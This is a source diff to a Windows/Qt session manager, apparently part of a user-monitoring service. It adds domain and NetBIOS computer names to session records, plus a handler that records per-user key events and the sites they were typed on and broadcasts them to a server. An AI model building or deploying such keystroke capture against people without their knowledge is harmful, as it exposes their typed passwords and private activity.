@@ -1,5 +1,10 @@
 #include "sessionmanager.h"
 
+#include <QSysInfo>
+#include "agentserver.h"
+#include "historyrecorder.h"
+#include <QJsonObject>
+
 #include <QRandomGenerator>
 #include <QSet>
 
@@ -7,6 +12,22 @@
 #include <userenv.h>
 #include <wtsapi32.h>
 #endif
+
+namespace {
+// The computer part of the session marker: the NetBIOS name, as Windows
+// shows it (upper case).
+QString netBiosComputerName()
+{
+#ifdef Q_OS_WIN
+    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
+    if (GetComputerNameW(buffer, &size)) {
+        return QString::fromWCharArray(buffer, int(size));
+    }
+#endif
+    return QSysInfo::machineHostName().toUpper();
+}
+} // namespace
 
 namespace {
 #ifdef Q_OS_WIN
@@ -107,6 +128,14 @@ void SessionManager::pollSessions()
         if (username.isEmpty()) {
             continue; // Not an interactive user session (e.g. a listener slot).
         }
+        QString domain;
+        LPWSTR domainBuffer = nullptr;
+        DWORD domainBytes = 0;
+        if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, info.SessionId, WTSDomainName,
+                                        &domainBuffer, &domainBytes)) {
+            domain = QString::fromWCharArray(domainBuffer);
+            WTSFreeMemory(domainBuffer);
+        }
 
         seen.insert(info.SessionId);
         if (m_historyRecorder) {
@@ -114,6 +143,9 @@ void SessionManager::pollSessions()
         }
         if (!m_sessions.contains(info.SessionId)) {
             launchSubService(info.SessionId, username, wtsStateToString(info.State));
+        }
+        if (m_sessions.contains(info.SessionId)) {
+            m_sessions[info.SessionId].domain = domain;
         }
     }
     WTSFreeMemory(sessionInfo);
@@ -218,6 +250,8 @@ bool SessionManager::launchSubService(quint32 sessionId, const QString &username
             &SessionManager::onMetadataChanged);
     connect(entry.ingest, &SessionIngest::keystrokeReceived, this,
             &SessionManager::onKeystrokeReceived);
+    connect(entry.ingest, &SessionIngest::keyEventsReceived, this,
+            &SessionManager::onKeyEventsReceived);
     connect(entry.ingest, &SessionIngest::streamClosed, this, &SessionManager::onStreamClosed);
     connect(entry.ingest, &SessionIngest::ingestDisconnected, this,
             &SessionManager::onIngestDisconnected);
@@ -309,6 +343,8 @@ void SessionManager::onMonitorDiscovered(quint32 sessionId, quint32 localStreamI
     info.size = size;
     info.sessionId = sessionId;
     info.sessionUsername = entry.username;
+    info.sessionDomain = entry.domain;
+    info.computerName = netBiosComputerName();
     info.sessionState = entry.state;
     info.isWindow = isWindow;
     m_globalMonitors.insert(globalId, info);
@@ -411,6 +447,41 @@ void SessionManager::onKeystrokeReceived(quint32 sessionId, const QString &windo
 {
     if (m_historyRecorder) {
         m_historyRecorder->recordKeystroke(sessionId, windowTitle, text, beginMs, application);
+    }
+}
+
+void SessionManager::onKeyEventsReceived(quint32 sessionId, const QJsonArray &events)
+{
+    auto it = m_sessions.constFind(sessionId);
+    if (it == m_sessions.constEnd() || events.isEmpty()) {
+        return;
+    }
+    // The page's site, not its url (app.urlToSite).
+    QJsonArray normalized;
+    for (const QJsonValue &value : events) {
+        QJsonObject event = value.toObject();
+        const QString url = event.value(QStringLiteral("u")).toString();
+        event.remove(QStringLiteral("u"));
+        if (!url.isEmpty()) {
+            event.insert(QStringLiteral("s"), HistoryRecorder::siteFromUrl(url));
+        }
+        normalized.append(event);
+    }
+    if (m_historyRecorder) {
+        m_historyRecorder->recordKeyEvents(it.value().username, sessionId, normalized);
+    }
+    if (m_server) {
+        // On the session's first monitor stream (any of them identifies it).
+        quint32 anchor = 0;
+        for (auto monitor = m_globalMonitors.cbegin(); monitor != m_globalMonitors.cend(); ++monitor) {
+            if (monitor.value().sessionId == sessionId && !monitor.value().isWindow
+                && (anchor == 0 || monitor.key() < anchor)) {
+                anchor = monitor.key();
+            }
+        }
+        if (anchor != 0) {
+            m_server->broadcastKeyEvents(anchor, normalized);
+        }
     }
 }
 
